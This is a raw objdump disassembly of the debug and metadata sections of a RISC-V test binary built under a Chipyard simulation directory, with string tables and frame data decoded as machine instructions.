 6fa:	006d                	c.nop	27
 6fc:	6e65                	lui	t3,0x19
 6fe:	6261                	lui	tp,0x18
 700:	656c                	ld	a1,200(a0)
 702:	6100                	ld	s0,0(a0)
 704:	6f62                	ld	t5,24(sp)
 706:	7472                	ld	s0,312(sp)
 708:	5f00                	lw	s0,56(a4)
 70a:	675f 756e 5f63      	0x5f63756e675f
 710:	6176                	ld	sp,344(sp)
 712:	6c5f 7369 0074      	0x7473696c5f
 718:	6170                	ld	a2,192(a0)
 71a:	6364                	ld	s1,192(a4)
 71c:	7300                	ld	s0,32(a4)
 71e:	6372                	ld	t1,280(sp)
 720:	7379732f          	0x7379732f
 724:	6c6c6163          	bltu	s8,t1,de6 <_tbss_end+0xd62>
 728:	00632e73          	csrrs	t3,0x6,t1
 72c:	74646977          	0x74646977
 730:	0068                	addi	a0,sp,12
 732:	30727473          	csrrci	s0,0x307,4
 736:	6300                	ld	s0,0(a4)
 738:	746e756f          	jal	a0,e7e7e <_tbss_end+0xe7dfa>
 73c:	7265                	lui	tp,0xffff9
 73e:	6f630073          	0x6f630073
 742:	6564                	ld	s1,200(a0)
 744:	6c00                	ld	s0,24(s0)
 746:	7366                	ld	t1,120(sp)
 748:	0072                	c.slli	zero,0x1c
 74a:	6d6f682f          	0x6d6f682f
 74e:	2f65                	addiw	t5,t5,25
 750:	6e656863          	bltu	a0,t1,e40 <_tbss_end+0xdbc>
 754:	61697867          	0x61697867
 758:	2f75796f          	jal	s2,5824e <_tbss_end+0x581ca>
 75c:	70696863          	bltu	s2,t1,e6c <_tbss_end+0xde8>
 760:	6179                	addi	sp,sp,464
 762:	6472                	ld	s0,280(sp)
 764:	6d69732f          	0x6d69732f
 768:	74612f73          	csrrs	t5,0x746,sp
 76c:	6174                	ld	a3,192(a0)
 76e:	00316b63          	bltu	sp,gp,784 <_tbss_end+0x700>
 772:	616c                	ld	a1,192(a0)
 774:	665f7473          	csrrci	s0,0x665,30
 778:	746d                	lui	s0,0xffffb
 77a:	6200                	ld	s0,0(a2)
 77c:	6675                	lui	a2,0x1d
 77e:	656c                	ld	a1,200(a0)
 780:	006e                	c.slli	zero,0x1b
 782:	6572                	ld	a0,280(sp)
 784:	74697773          	csrrci	a4,0x746,18
 788:	73006863          	bltu	zero,a6,eb8 <_tbss_end+0xe34>
 78c:	7274                	ld	a3,224(a2)
 78e:	00706d63          	bltu	zero,t2,7a8 <_tbss_end+0x724>
 792:	7270                	ld	a2,224(a2)
 794:	6e69                	lui	t3,0x1a
 796:	4474                	lw	a3,76(s0)
 798:	6c62756f          	jal	a0,27e5e <_tbss_end+0x27dda>
 79c:	4165                	li	sp,25
 79e:	7272                	ld	tp,312(sp)
 7a0:	7961                	lui	s2,0xffff8
 7a2:	6c00                	ld	s0,24(s0)
 7a4:	6c66                	ld	s8,88(sp)
 7a6:	6761                	lui	a4,0x18
 7a8:	7000                	ld	s0,32(s0)
 7aa:	00727473          	csrrci	s0,0x7,4
 7ae:	656d                	lui	a0,0x1b
 7b0:	736d                	lui	t1,0xffffb
 7b2:	7465                	lui	s0,0xffff9
 7b4:	6100                	ld	s0,0(a0)
 7b6:	6772                	ld	a4,280(sp)
 7b8:	0030                	addi	a2,sp,8
 7ba:	7261                	lui	tp,0xffff8
 7bc:	61003167          	0x61003167
 7c0:	6772                	ld	a4,280(sp)
 7c2:	0032                	c.slli	zero,0xc
 7c4:	695f 696e 0074      	0x74696e695f
 7ca:	63737973          	csrrci	s2,0x637,6
 7ce:	6c61                	lui	s8,0x18
 7d0:	006c                	addi	a1,sp,12
 7d2:	6576                	ld	a0,344(sp)
 7d4:	6972                	ld	s2,280(sp)
 7d6:	7966                	ld	s2,120(sp)
 7d8:	6f44                	ld	s1,152(a4)
 7da:	6275                	lui	tp,0x1d
 7dc:	656c                	ld	a1,200(a0)
 7de:	6700                	ld	s0,8(a4)
 7e0:	7465                	lui	s0,0xffff9
 7e2:	6e69                	lui	t3,0x1a
 7e4:	0074                	addi	a3,sp,12
 7e6:	6e75                	lui	t3,0x1d
 7e8:	6e676973          	csrrsi	s2,0x6e6,14
 7ec:	6465                	lui	s0,0x19
 7ee:	6e5f 6d75 6562      	0x65626d756e5f
 7f4:	0072                	c.slli	zero,0x1c
 7f6:	7570                	ld	a2,232(a0)
 7f8:	6474                	ld	a3,200(s0)
 7fa:	7461                	lui	s0,0xffff8
 7fc:	6100                	ld	s0,0(a0)
 7fe:	6772                	ld	a4,280(sp)
 800:	68770063          	beq	a4,t2,e80 <_tbss_end+0xdfc>
 804:	6369                	lui	t1,0x1a
 806:	0068                	addi	a0,sp,12
 808:	7261                	lui	tp,0xffff8
 80a:	73007667          	0x73007667
 80e:	7270                	ld	a2,224(a2)
 810:	6e69                	lui	t3,0x1a
 812:	6674                	ld	a3,200(a2)
 814:	5f00                	lw	s0,56(a4)
 816:	6474                	ld	a3,200(s0)
 818:	7461                	lui	s0,0xffff8
 81a:	5f61                	li	t5,-8
 81c:	6562                	ld	a0,24(sp)
 81e:	006e6967          	0x6e6967
 822:	636e                	ld	t1,216(sp)
 824:	7365726f          	jal	tp,57f5a <_tbss_end+0x57ed6>
 828:	5f00                	lw	s0,56(a4)
 82a:	755f 6e69 7074      	0x70746e69755f
 830:	7274                	ld	a3,224(a2)
 832:	745f 6100 746c      	0x746c6100745f
 838:	6c66                	ld	s8,88(sp)
 83a:	6761                	lui	a4,0x18
 83c:	7400                	ld	s0,40(s0)
 83e:	7362                	ld	t1,56(sp)
 840:	69735f73          	csrrwi	t5,0x697,6
 844:	657a                	ld	a0,408(sp)
 846:	7400                	ld	s0,40(s0)
 848:	7268                	ld	a0,224(a2)
 84a:	6165                	addi	sp,sp,112
 84c:	5f64                	lw	s1,124(a4)
 84e:	6f70                	ld	a2,216(a4)
 850:	6e69                	lui	t3,0x1a
 852:	6574                	ld	a3,200(a0)
 854:	0072                	c.slli	zero,0x1c
 856:	6e756f63          	bltu	a0,t2,f54 <_tbss_end+0xed0>
 85a:	6574                	ld	a3,200(a0)
 85c:	5f72                	lw	t5,60(sp)
 85e:	616e                	ld	sp,216(sp)
 860:	656d                	lui	a0,0x1b
 862:	6f770073          	0x6f770073
 866:	6472                	ld	s0,280(sp)
 868:	5f00                	lw	s0,56(a4)
 86a:	6274                	ld	a3,192(a2)
 86c:	655f7373          	csrrci	t1,0x655,30
 870:	646e                	ld	s0,216(sp)
 872:	4700                	lw	s0,8(a4)
 874:	554e                	lw	a0,240(sp)
 876:	4320                	lw	s0,64(a4)
 878:	3731                	addiw	a4,a4,-20
 87a:	3920                	fld	fs0,112(a0)
 87c:	322e                	fld	ft4,232(sp)
 87e:	302e                	fld	ft0,232(sp)
 880:	2d20                	fld	fs0,88(a0)
 882:	636d                	lui	t1,0x1b
 884:	6f6d                	lui	t5,0x1b
 886:	6564                	ld	s1,200(a0)
 888:	3d6c                	fld	fa1,248(a0)
 88a:	656d                	lui	a0,0x1b
 88c:	6164                	ld	s1,192(a0)
 88e:	796e                	ld	s2,248(sp)
 890:	2d20                	fld	fs0,88(a0)
 892:	746d                	lui	s0,0xffffb
 894:	6e75                	lui	t3,0x1d
 896:	3d65                	addiw	s10,s10,-7
 898:	6f72                	ld	t5,280(sp)
 89a:	74656b63          	bltu	a0,t1,ff0 <_tbss_end+0xf6c>
 89e:	2d20                	fld	fs0,88(a0)
 8a0:	616d                	addi	sp,sp,240
 8a2:	6372                	ld	t1,280(sp)
 8a4:	3d68                	fld	fa0,248(a0)
 8a6:	7672                	ld	a2,312(sp)
 8a8:	3436                	fld	fs0,360(sp)
 8aa:	6d69                	lui	s10,0x1a
 8ac:	6661                	lui	a2,0x18
 8ae:	6364                	ld	s1,192(a4)
 8b0:	2d20                	fld	fs0,88(a0)
 8b2:	616d                	addi	sp,sp,240
 8b4:	6962                	ld	s2,24(sp)
 8b6:	6c3d                	lui	s8,0xf
 8b8:	3670                	fld	fa2,232(a2)
 8ba:	6434                	ld	a3,72(s0)
 8bc:	2d20                	fld	fs0,88(a0)
 8be:	4f2d2067          	0x4f2d2067
 8c2:	2030                	fld	fa2,64(s0)
 8c4:	662d                	lui	a2,0xb
 8c6:	6f6e                	ld	t5,216(sp)
 8c8:	632d                	lui	t1,0xb
 8ca:	6f6d6d6f          	jal	s10,d6fc0 <_tbss_end+0xd6f3c>
 8ce:	206e                	fld	ft0,216(sp)
 8d0:	662d                	lui	a2,0xb
 8d2:	6f6e                	ld	t5,216(sp)
 8d4:	622d                	lui	tp,0xb
 8d6:	6975                	lui	s2,0x1d
 8d8:	746c                	ld	a1,232(s0)
 8da:	6e69                	lui	t3,0x1a
 8dc:	702d                	c.lui	zero,0xfffeb
 8de:	6972                	ld	s2,280(sp)
 8e0:	746e                	ld	s0,248(sp)
 8e2:	0066                	c.slli	zero,0x19
 8e4:	6f74                	ld	a3,216(a4)
 8e6:	6f68                	ld	a0,216(a4)
 8e8:	64007473          	csrrci	s0,0x640,0
 8ec:	6769                	lui	a4,0x1a
 8ee:	70730073          	0x70730073
 8f2:	6972                	ld	s2,280(sp)
 8f4:	746e                	ld	s0,248(sp)
 8f6:	5f66                	lw	t5,120(sp)
 8f8:	7570                	ld	a2,232(a0)
 8fa:	6374                	ld	a3,192(a4)
 8fc:	0068                	addi	a0,sp,12
 8fe:	7962                	ld	s2,56(sp)
 900:	6574                	ld	a3,200(a0)
 902:	7000                	ld	s0,32(s0)
 904:	6972                	ld	s2,280(sp)
 906:	746e                	ld	s0,248(sp)
 908:	6568                	ld	a0,200(a0)
 90a:	0078                	addi	a4,sp,12
 90c:	6874                	ld	a3,208(s0)
 90e:	6572                	ld	a0,280(sp)
 910:	6461                	lui	s0,0x18
 912:	736e6573          	csrrsi	a0,0x736,28
 916:	0065                	c.nop	25
 918:	6574                	ld	a3,200(a0)
 91a:	70007473          	csrrci	s0,0x700,0
 91e:	7562                	ld	a0,56(sp)
 920:	0066                	c.slli	zero,0x19
 922:	616d                	addi	sp,sp,240
 924:	5f636967          	0x5f636967
 928:	656d                	lui	a0,0x1b
 92a:	006d                	c.nop	27
 92c:	6f74                	ld	a3,216(a4)
 92e:	6f68                	ld	a0,216(a4)
 930:	655f7473          	csrrci	s0,0x655,30
 934:	6978                	ld	a4,208(a0)
 936:	0074                	addi	a3,sp,12
 938:	7266                	ld	tp,120(sp)
 93a:	6f686d6f          	jal	s10,87030 <_tbss_end+0x86fac>
 93e:	6d007473          	csrrci	s0,0x6d0,0
 942:	6d65                	lui	s10,0x19
 944:	00797063          	bleu	t2,s2,944 <_tbss_end+0x8c0>
 948:	5f5f 7562 6c69      	0x6c6975625f5f
 94e:	6974                	ld	a3,208(a0)
 950:	5f6e                	lw	t5,248(sp)
 952:	6176                	ld	sp,344(sp)
 954:	6c5f 7369 0074      	0x7473696c5f
 95a:	7461                	lui	s0,0xffff8
 95c:	73006c6f          	jal	s8,708c <_tbss_end+0x7008>
 960:	7465                	lui	s0,0xffff9
 962:	74617453          	0x74617453
 966:	6e690073          	0x6e690073
 96a:	7469                	lui	s0,0xffffa
 96c:	745f 736c 7600      	0x7600736c745f
 972:	7265                	lui	tp,0xffff9
 974:	6669                	lui	a2,0x1a
 976:	0079                	c.nop	30
 978:	6564                	ld	s1,200(a0)
 97a:	76007473          	csrrci	s0,0x760,0
 97e:	7270                	ld	a2,224(a2)
 980:	6e69                	lui	t3,0x1a
 982:	6674                	ld	a3,200(a2)
 984:	746d                	lui	s0,0xffffb
	...

Disassembly of section .comment:

0000000000000000 <.comment>:
   0:	3a434347          	fmsub.d	ft6,ft6,ft4,ft7,rmm
   4:	2820                	fld	fs0,80(s0)
   6:	29554e47          	fmsub.s	ft8,fa0,fs5,ft5,rmm
   a:	3720                	fld	fs0,104(a4)
   c:	322e                	fld	ft4,232(sp)
   e:	302e                	fld	ft0,232(sp)
  10:	4700                	lw	s0,8(a4)
  12:	203a4343          	fmadd.s	ft6,fs4,ft3,ft4,rmm
  16:	4728                	lw	a0,72(a4)
  18:	554e                	lw	a0,240(sp)
  1a:	2029                	0x2029
  1c:	2e39                	addiw	t3,t3,14
  1e:	2e32                	fld	ft8,264(sp)
  20:	0030                	addi	a2,sp,8

Disassembly of section .riscv.attributes:

0000000000000000 <.riscv.attributes>:
   0:	3441                	addiw	s0,s0,-16
   2:	0000                	unimp
   4:	7200                	ld	s0,32(a2)
   6:	7369                	lui	t1,0xffffa
   8:	01007663          	bleu	a6,zero,14 <_tdata_begin+0x14>
   c:	002a                	c.slli	zero,0xa
   e:	0000                	unimp
  10:	1004                	addi	s1,sp,32
  12:	7205                	lui	tp,0xfffe1
  14:	3676                	fld	fa2,376(sp)
  16:	6934                	ld	a3,80(a0)
  18:	7032                	0x7032
  1a:	5f30                	lw	a2,120(a4)
  1c:	326d                	addiw	tp,tp,-5
  1e:	3070                	fld	fa2,224(s0)
  20:	615f 7032 5f30      	0x5f307032615f
  26:	3266                	fld	ft4,120(sp)
  28:	3070                	fld	fa2,224(s0)
  2a:	645f 7032 5f30      	0x5f307032645f
  30:	30703263          	0x30703263
	...

Disassembly of section .debug_frame:

0000000000000000 <.debug_frame>:
   0:	000c                	0xc
   2:	0000                	unimp
   4:	ffff                	0xffff
   6:	ffff                	0xffff
   8:	0001                	nop
   a:	7c01                	lui	s8,0xfffe0
   c:	0d01                	addi	s10,s10,0
   e:	0002                	c.slli	zero,0x0
  10:	0024                	addi	s1,sp,8
  12:	0000                	unimp
  14:	0000                	unimp
  16:	0000                	unimp
  18:	1048                	addi	a0,sp,36
  1a:	8000                	0x8000
  1c:	0000                	unimp
  1e:	0000                	unimp
  20:	00ce                	slli	ra,ra,0x13
  22:	0000                	unimp
  24:	0000                	unimp
  26:	0000                	unimp
  28:	0e42                	slli	t3,t3,0x10
  2a:	4260                	lw	s0,68(a2)
  2c:	0288                	addi	a0,sp,320
  2e:	0c42                	slli	s8,s8,0x10
  30:	0008                	0x8
  32:	c402                	sw	zero,8(sp)
  34:	42c8                	lw	a0,4(a3)
  36:	020d                	addi	tp,tp,3
  38:	0024                	addi	s1,sp,8
  3a:	0000                	unimp
  3c:	0000                	unimp
  3e:	0000                	unimp
  40:	1116                	slli	sp,sp,0x25
  42:	8000                	0x8000
  44:	0000                	unimp
  46:	0000                	unimp
  48:	00ec                	addi	a1,sp,76
  4a:	0000                	unimp
  4c:	0000                	unimp
  4e:	0000                	unimp
  50:	0e42                	slli	t3,t3,0x10
  52:	4240                	lw	s0,4(a2)
  54:	0288                	addi	a0,sp,320
  56:	0c42                	slli	s8,s8,0x10
  58:	0008                	0x8
  5a:	e202                	sd	zero,256(sp)
  5c:	42c8                	lw	a0,4(a3)
  5e:	020d                	addi	tp,tp,3
  60:	0024                	addi	s1,sp,8
  62:	0000                	unimp
  64:	0000                	unimp
  66:	0000                	unimp
  68:	1202                	slli	tp,tp,0x20
  6a:	8000                	0x8000
  6c:	0000                	unimp
  6e:	0000                	unimp
  70:	00b2                	slli	ra,ra,0xc
  72:	0000                	unimp
  74:	0000                	unimp
  76:	0000                	unimp
  78:	0e42                	slli	t3,t3,0x10
  7a:	4230                	lw	a2,64(a2)
  7c:	0288                	addi	a0,sp,320
  7e:	0c42                	slli	s8,s8,0x10
  80:	0008                	0x8
  82:	a802                	fsd	ft0,16(sp)
  84:	42c8                	lw	a0,4(a3)
  86:	020d                	addi	tp,tp,3
  88:	002c                	addi	a1,sp,8
  8a:	0000                	unimp
  8c:	0000                	unimp
  8e:	0000                	unimp
  90:	12b4                	addi	a3,sp,360
  92:	8000                	0x8000
  94:	0000                	unimp
  96:	0000                	unimp
  98:	031a                	slli	t1,t1,0x6
  9a:	0000                	unimp
  9c:	0000                	unimp
  9e:	0000                	unimp
  a0:	0e42                	slli	t3,t3,0x10
  a2:	01b0                	addi	a2,sp,200
  a4:	8144                	0x8144
  a6:	8802                	jr	a6
  a8:	4204                	lw	s1,0(a2)
  aa:	080c                	addi	a1,sp,16
  ac:	0300                	addi	s0,sp,384
  ae:	030c                	addi	a1,sp,384
  b0:	42c1                	li	t0,16
  b2:	42c8                	lw	a0,4(a3)
  b4:	020d                	addi	tp,tp,3
  b6:	0000                	unimp
  b8:	000c                	0xc
  ba:	0000                	unimp
  bc:	ffff                	0xffff
  be:	ffff                	0xffff
  c0:	0001                	nop
  c2:	7c01                	lui	s8,0xfffe0
  c4:	0d01                	addi	s10,s10,0
  c6:	0002                	c.slli	zero,0x0
  c8:	002c                	addi	a1,sp,8
  ca:	0000                	unimp
  cc:	00b8                	addi	a4,sp,72
  ce:	0000                	unimp
  d0:	15fc                	addi	a5,sp,748
  d2:	8000                	0x8000
  d4:	0000                	unimp
  d6:	0000                	unimp
  d8:	001c                	0x1c
  da:	0000                	unimp
  dc:	0000                	unimp
  de:	0000                	unimp
  e0:	0e42                	slli	t3,t3,0x10
  e2:	4230                	lw	a2,64(a2)
  e4:	0288                	addi	a0,sp,320
  e6:	0c42                	slli	s8,s8,0x10
  e8:	0008                	0x8
  ea:	c852                	sw	s4,16(sp)
  ec:	020c                	addi	a1,sp,256
  ee:	4230                	lw	a2,64(a2)
  f0:	000e                	c.slli	zero,0x3
  f2:	0000                	unimp
  f4:	0000                	unimp
  f6:	0000                	unimp
  f8:	002c                	addi	a1,sp,8
  fa:	0000                	unimp
  fc:	00b8                	addi	a4,sp,72
  fe:	0000                	unimp
 100:	1618                	addi	a4,sp,800
 102:	8000                	0x8000
 104:	0000                	unimp
 106:	0000                	unimp
 108:	001c                	0x1c
 10a:	0000                	unimp
 10c:	0000                	unimp
 10e:	0000                	unimp
 110:	0e42                	slli	t3,t3,0x10
 112:	4230                	lw	a2,64(a2)
 114:	0288                	addi	a0,sp,320
 116:	0c42                	slli	s8,s8,0x10
 118:	0008                	0x8
 11a:	c852                	sw	s4,16(sp)
 11c:	020c                	addi	a1,sp,256
 11e:	4230                	lw	a2,64(a2)
 120:	000e                	c.slli	zero,0x3
 122:	0000                	unimp
 124:	0000                	unimp
 126:	0000                	unimp
 128:	002c                	addi	a1,sp,8
 12a:	0000                	unimp
 12c:	00b8                	addi	a4,sp,72
 12e:	0000                	unimp
 130:	1634                	addi	a3,sp,808
 132:	8000                	0x8000
 134:	0000                	unimp
 136:	0000                	unimp
 138:	010a                	slli	sp,sp,0x2
 13a:	0000                	unimp
 13c:	0000                	unimp
 13e:	0000                	unimp
 140:	0e42                	slli	t3,t3,0x10
 142:	4250                	lw	a2,4(a2)
 144:	0288                	addi	a0,sp,320
 146:	0c42                	slli	s8,s8,0x10
 148:	0008                	0x8
 14a:	c8010003          	lb	zero,-896(sp)
 14e:	020c                	addi	a1,sp,256
 150:	4250                	lw	a2,4(a2)
 152:	000e                	c.slli	zero,0x3
 154:	0000                	unimp
 156:	0000                	unimp
 158:	002c                	addi	a1,sp,8
 15a:	0000                	unimp
 15c:	00b8                	addi	a4,sp,72
 15e:	0000                	unimp
 160:	173e                	slli	a4,a4,0x2f
 162:	8000                	0x8000
 164:	0000                	unimp
 166:	0000                	unimp
 168:	0122                	slli	sp,sp,0x8
 16a:	0000                	unimp
 16c:	0000                	unimp
 16e:	0000                	unimp
 170:	0e42                	slli	t3,t3,0x10
 172:	4260                	lw	s0,68(a2)
 174:	0288                	addi	a0,sp,320
 176:	0c42                	slli	s8,s8,0x10
 178:	0008                	0x8
 17a:	c8011803          	lh	a6,-896(sp)
 17e:	020c                	addi	a1,sp,256
 180:	4260                	lw	s0,68(a2)
 182:	000e                	c.slli	zero,0x3
 184:	0000                	unimp
 186:	0000                	unimp
 188:	002c                	addi	a1,sp,8
 18a:	0000                	unimp
 18c:	00b8                	addi	a4,sp,72
 18e:	0000                	unimp
 190:	1860                	addi	s0,sp,60
 192:	8000                	0x8000
 194:	0000                	unimp
 196:	0000                	unimp
 198:	008a                	slli	ra,ra,0x2
 19a:	0000                	unimp
 19c:	0000                	unimp
 19e:	0000                	unimp
 1a0:	0e42                	slli	t3,t3,0x10
 1a2:	4220                	lw	s0,64(a2)
 1a4:	0288                	addi	a0,sp,320
 1a6:	0c42                	slli	s8,s8,0x10
 1a8:	0008                	0x8
 1aa:	8002                	0x8002
 1ac:	0cc8                	addi	a0,sp,596
 1ae:	2002                	fld	ft0,0(sp)
 1b0:	0e42                	slli	t3,t3,0x10
 1b2:	0000                	unimp
 1b4:	0000                	unimp
 1b6:	0000                	unimp
 1b8:	002c                	addi	a1,sp,8
 1ba:	0000                	unimp
 1bc:	00b8                	addi	a4,sp,72
 1be:	0000                	unimp
 1c0:	18ea                	slli	a7,a7,0x3a
 1c2:	8000                	0x8000
 1c4:	0000                	unimp
 1c6:	0000                	unimp
 1c8:	0036                	c.slli	zero,0xd
 1ca:	0000                	unimp
 1cc:	0000                	unimp
 1ce:	0000                	unimp
 1d0:	0e42                	slli	t3,t3,0x10
 1d2:	4230                	lw	a2,64(a2)
 1d4:	0288                	addi	a0,sp,320
 1d6:	0c42                	slli	s8,s8,0x10
 1d8:	0008                	0x8
 1da:	c86c                	sw	a1,84(s0)
 1dc:	020c                	addi	a1,sp,256
 1de:	4230                	lw	a2,64(a2)
 1e0:	000e                	c.slli	zero,0x3
 1e2:	0000                	unimp
 1e4:	0000                	unimp
 1e6:	0000                	unimp
 1e8:	002c                	addi	a1,sp,8
 1ea:	0000                	unimp
 1ec:	00b8                	addi	a4,sp,72
 1ee:	0000                	unimp
 1f0:	1920                	addi	s0,sp,184
 1f2:	8000                	0x8000
 1f4:	0000                	unimp
 1f6:	0000                	unimp
 1f8:	007e                	c.slli	zero,0x1f
 1fa:	0000                	unimp
 1fc:	0000                	unimp
 1fe:	0000                	unimp
 200:	0e42                	slli	t3,t3,0x10
 202:	01b0                	addi	a2,sp,200
 204:	8842                	mv	a6,a6
 206:	4202                	lw	tp,0(sp)
 208:	080c                	addi	a1,sp,16
 20a:	0200                	addi	s0,sp,256
 20c:	c874                	sw	a3,84(s0)
 20e:	020c                	addi	a1,sp,256
 210:	01b0                	addi	a2,sp,200
 212:	0e42                	slli	t3,t3,0x10
 214:	0000                	unimp
 216:	0000                	unimp
 218:	002c                	addi	a1,sp,8
 21a:	0000                	unimp
 21c:	00b8                	addi	a4,sp,72
 21e:	0000                	unimp
 220:	199e                	slli	s3,s3,0x27
 222:	8000                	0x8000
 224:	0000                	unimp
 226:	0000                	unimp
 228:	0110                	addi	a2,sp,128
 22a:	0000                	unimp
 22c:	0000                	unimp
 22e:	0000                	unimp
 230:	0e42                	slli	t3,t3,0x10
 232:	4250                	lw	a2,4(a2)
 234:	0288                	addi	a0,sp,320
 236:	0c42                	slli	s8,s8,0x10
 238:	0008                	0x8
 23a:	c8010603          	lb	a2,-896(sp)
 23e:	020c                	addi	a1,sp,256
 240:	4250                	lw	a2,4(a2)
 242:	000e                	c.slli	zero,0x3
 244:	0000                	unimp
 246:	0000                	unimp
 248:	0024                	addi	s1,sp,8
 24a:	0000                	unimp
 24c:	00b8                	addi	a4,sp,72
 24e:	0000                	unimp
 250:	1aae                	slli	s5,s5,0x2b
 252:	8000                	0x8000
 254:	0000                	unimp
 256:	0000                	unimp
 258:	0020                	addi	s0,sp,8
 25a:	0000                	unimp
 25c:	0000                	unimp
 25e:	0000                	unimp
 260:	0e42                	slli	t3,t3,0x10
 262:	4220                	lw	s0,64(a2)
 264:	0288                	addi	a0,sp,320
 266:	0c42                	slli	s8,s8,0x10
 268:	0008                	0x8
 26a:	0000                	unimp
 26c:	0000                	unimp
 26e:	0000                	unimp
 270:	0024                	addi	s1,sp,8
 272:	0000                	unimp
 274:	00b8                	addi	a4,sp,72
 276:	0000                	unimp
 278:	1ace                	slli	s5,s5,0x33
 27a:	8000                	0x8000
 27c:	0000                	unimp
 27e:	0000                	unimp
 280:	001c                	0x1c
 282:	0000                	unimp
 284:	0000                	unimp
 286:	0000                	unimp
 288:	0e42                	slli	t3,t3,0x10
 28a:	4430                	lw	a2,72(s0)
 28c:	0281                	addi	t0,t0,0
 28e:	0488                	addi	a0,sp,576
 290:	0c42                	slli	s8,s8,0x10
 292:	0008                	0x8
 294:	0000                	unimp
 296:	0000                	unimp
 298:	0024                	addi	s1,sp,8
 29a:	0000                	unimp
 29c:	00b8                	addi	a4,sp,72
 29e:	0000                	unimp
 2a0:	1aea                	slli	s5,s5,0x3a
 2a2:	8000                	0x8000
 2a4:	0000                	unimp
 2a6:	0000                	unimp
 2a8:	0018                	0x18
 2aa:	0000                	unimp
 2ac:	0000                	unimp
 2ae:	0000                	unimp
 2b0:	0e42                	slli	t3,t3,0x10
 2b2:	4420                	lw	s0,72(s0)
 2b4:	0281                	addi	t0,t0,0
 2b6:	0488                	addi	a0,sp,576
 2b8:	0c42                	slli	s8,s8,0x10
 2ba:	0008                	0x8
 2bc:	0000                	unimp
 2be:	0000                	unimp
 2c0:	0024                	addi	s1,sp,8
 2c2:	0000                	unimp
 2c4:	00b8                	addi	a4,sp,72
 2c6:	0000                	unimp
 2c8:	1b02                	slli	s6,s6,0x20
 2ca:	8000                	0x8000
 2cc:	0000                	unimp
 2ce:	0000                	unimp
 2d0:	0010                	0x10
 2d2:	0000                	unimp
 2d4:	0000                	unimp
 2d6:	0000                	unimp
 2d8:	0e42                	slli	t3,t3,0x10
 2da:	4410                	lw	a2,8(s0)
 2dc:	0281                	addi	t0,t0,0
 2de:	0488                	addi	a0,sp,576
 2e0:	0c42                	slli	s8,s8,0x10
 2e2:	0008                	0x8
 2e4:	0000                	unimp
 2e6:	0000                	unimp
 2e8:	0034                	addi	a3,sp,8
 2ea:	0000                	unimp
 2ec:	00b8                	addi	a4,sp,72
 2ee:	0000                	unimp
 2f0:	1b12                	slli	s6,s6,0x24
 2f2:	8000                	0x8000
 2f4:	0000                	unimp
 2f6:	0000                	unimp
 2f8:	0036                	c.slli	zero,0xd
 2fa:	0000                	unimp
 2fc:	0000                	unimp
 2fe:	0000                	unimp
 300:	0e42                	slli	t3,t3,0x10
 302:	4630                	lw	a2,72(a2)
 304:	0281                	addi	t0,t0,0
 306:	0488                	addi	a0,sp,576
 308:	0689                	addi	a3,a3,2
 30a:	0c42                	slli	s8,s8,0x10
 30c:	0008                	0x8
 30e:	c164                	sw	s1,68(a0)
 310:	c842                	sw	a6,16(sp)
 312:	020c                	addi	a1,sp,256
 314:	4230                	lw	a2,64(a2)
 316:	42c9                	li	t0,18
 318:	000e                	c.slli	zero,0x3
 31a:	0000                	unimp
 31c:	0000                	unimp
 31e:	0000                	unimp
 320:	002c                	addi	a1,sp,8
 322:	0000                	unimp
 324:	00b8                	addi	a4,sp,72
 326:	0000                	unimp
 328:	1b48                	addi	a0,sp,436
 32a:	8000                	0x8000
 32c:	0000                	unimp
 32e:	0000                	unimp
 330:	0026                	c.slli	zero,0x9
 332:	0000                	unimp
 334:	0000                	unimp
 336:	0000                	unimp
 338:	0e42                	slli	t3,t3,0x10
 33a:	4220                	lw	s0,64(a2)
 33c:	0288                	addi	a0,sp,320
 33e:	0c42                	slli	s8,s8,0x10
 340:	0008                	0x8
 342:	c85c                	sw	a5,20(s0)
 344:	020c                	addi	a1,sp,256
 346:	4220                	lw	s0,64(a2)
 348:	000e                	c.slli	zero,0x3
 34a:	0000                	unimp
 34c:	0000                	unimp
 34e:	0000                	unimp
 350:	002c                	addi	a1,sp,8
 352:	0000                	unimp
 354:	00b8                	addi	a4,sp,72
 356:	0000                	unimp
 358:	1b6e                	slli	s6,s6,0x3b
 35a:	8000                	0x8000
 35c:	0000                	unimp
 35e:	0000                	unimp
 360:	002a                	c.slli	zero,0xa
 362:	0000                	unimp
 364:	0000                	unimp
 366:	0000                	unimp
 368:	0e42                	slli	t3,t3,0x10
 36a:	4420                	lw	s0,72(s0)
 36c:	0281                	addi	t0,t0,0
 36e:	0488                	addi	a0,sp,576
 370:	0c42                	slli	s8,s8,0x10
 372:	0008                	0x8
 374:	c15c                	sw	a5,4(a0)
 376:	c842                	sw	a6,16(sp)
 378:	020c                	addi	a1,sp,256
 37a:	4220                	lw	s0,64(a2)
 37c:	000e                	c.slli	zero,0x3
 37e:	0000                	unimp
 380:	002c                	addi	a1,sp,8
 382:	0000                	unimp
 384:	00b8                	addi	a4,sp,72
 386:	0000                	unimp
 388:	1b98                	addi	a4,sp,496
 38a:	8000                	0x8000
 38c:	0000                	unimp
 38e:	0000                	unimp
 390:	005a                	c.slli	zero,0x16
 392:	0000                	unimp
 394:	0000                	unimp
 396:	0000                	unimp
 398:	0e42                	slli	t3,t3,0x10
 39a:	4420                	lw	s0,72(s0)
 39c:	0281                	addi	t0,t0,0
 39e:	0488                	addi	a0,sp,576
 3a0:	0c42                	slli	s8,s8,0x10
 3a2:	0008                	0x8
 3a4:	4c02                	lw	s8,0(sp)
 3a6:	42c1                	li	t0,16
 3a8:	0cc8                	addi	a0,sp,596
 3aa:	2002                	fld	ft0,0(sp)
 3ac:	0e42                	slli	t3,t3,0x10
 3ae:	0000                	unimp
 3b0:	0024                	addi	s1,sp,8
 3b2:	0000                	unimp
 3b4:	00b8                	addi	a4,sp,72
 3b6:	0000                	unimp
 3b8:	1bf2                	slli	s7,s7,0x3c
 3ba:	8000                	0x8000
 3bc:	0000                	unimp
 3be:	0000                	unimp
 3c0:	00e6                	slli	ra,ra,0x19
 3c2:	0000                	unimp
 3c4:	0000                	unimp
 3c6:	0000                	unimp
 3c8:	0e42                	slli	t3,t3,0x10
 3ca:	01b0                	addi	a2,sp,200
 3cc:	8146                	mv	sp,a7
 3ce:	8802                	jr	a6
 3d0:	8904                	0x8904
 3d2:	4206                	lw	tp,64(sp)
 3d4:	080c                	addi	a1,sp,16
 3d6:	0000                	unimp
 3d8:	002c                	addi	a1,sp,8
 3da:	0000                	unimp
 3dc:	00b8                	addi	a4,sp,72
 3de:	0000                	unimp
 3e0:	1cd8                	addi	a4,sp,628
 3e2:	8000                	0x8000
